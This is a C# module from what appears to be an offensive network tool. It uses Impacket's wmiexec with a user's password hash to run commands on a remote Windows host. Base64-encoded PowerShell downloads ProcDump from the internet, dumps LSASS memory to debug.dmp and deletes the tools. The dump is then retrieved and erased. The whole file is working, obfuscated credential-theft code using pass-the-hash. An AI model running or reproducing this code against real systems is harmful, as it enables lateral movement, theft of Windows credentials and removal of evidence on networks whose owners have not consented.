using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using ElCazador.Worker.Interfaces;
using ElCazador.Worker.Models;

namespace ElCazador.Worker.Modules.Tools
{
    public class LsassDumpTool : AbstractModule, IToolModule
    {
        public LsassDumpTool(IWorkerController controller, string name) : base(controller, name)
        {
        }

        public async Task Run(Target target, User user)
        {
            var command1 = @"""powershell -enc ""aQB3AHIAIAAtAG8AdQB0AGYAIABwAHIAbwBjAGQAdQBtAHAALgB6AGkAcAAgAGgAdAB0AHAAcwA6AC8ALwBkAG8AdwBuAGwAbwBhAGQALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AUAByAG8AYwBkAHUAbQBwAC4AegBpAHAAOwAgAEEAZABkAC0AVAB5AHAAZQAgAC0AYQBzAHMAZQBtAGIAbAB5ACAAIgBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEYAaQBsAGUAcwB5AHMAdABlAG0AIgA7ACAAWwBTAHQAcgBpAG4AZwBdACQAUwBvAHUAcgBjAGUAIAA9ACAAIgBwAHIAbwBjAGQAdQBtAHAALgB6AGkAcAAiADsAIABbAFMAdAByAGkAbgBnAF0AJABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAA9ACAAIgBwAHIAbwBjAGQAdQBtAHAAIgA7ACAAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBaAGkAcABmAGkAbABlAF0AOgA6AEUAeAB0AHIAYQBjAHQAVABvAEQAaQByAGUAYwB0AG8AcgB5ACgAJABTAG8AdQByAGMAZQAsACAAJABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AKQA7ACAAIABwAHIAbwBjAGQAdQBtAHAAXABwAHIAbwBjAGQAdQBtAHAANgA0AC4AZQB4AGUAIAAtAGEAYwBjAGUAcAB0AGUAdQBsAGEAIAAtAG8AIAAtAG0AYQAgAGwAcwBhAHMAcwAuAGUAeABlACAAZABlAGIAdQBnAC4AZABtAHAAOwAgACAAcgBtACAALQByACAAcAByAG8AYwBkAHUAbQBwAC4AegBpAHAAOwAgAHIAbQAgAC0AcgAgAHAAcgBvAGMAZAB1AG0AcAA7AA==""""";

            var command2 = @"get debug.dmp";

            var command3 = @"""powershell -enc ""cgBtACAAZABlAGIAdQBnAC4AZABtAHAA""""";


            RunProcess(target, user, command1);
            RunProcess(target, user, command2);
            RunProcess(target, user, command3);

            // return Task.CompletedTask;
        }

        private void RunProcess(Target target, User user, string command)
        {
            var arguments = string.Format(
                "{5}wmiexec.py {0}/{1}{2}@{3} {4}",
                user.Domain,
                user.Username,
                ":" + user.Hash,
                target.IP,
                command,
                Controller.WorkerSettings.ImpacketExamplesPath
                );

            Console.WriteLine(arguments);

            var startInfo = new ProcessStartInfo();
            startInfo.FileName = "python";
            startInfo.Arguments = arguments;

            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;

            using (Process process = Process.Start(startInfo))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string stderr = process.StandardError.ReadToEnd();
                    string result = reader.ReadToEnd();

                    Console.WriteLine(stderr);
                    Console.WriteLine(result);
                }
            }
        }
    }
}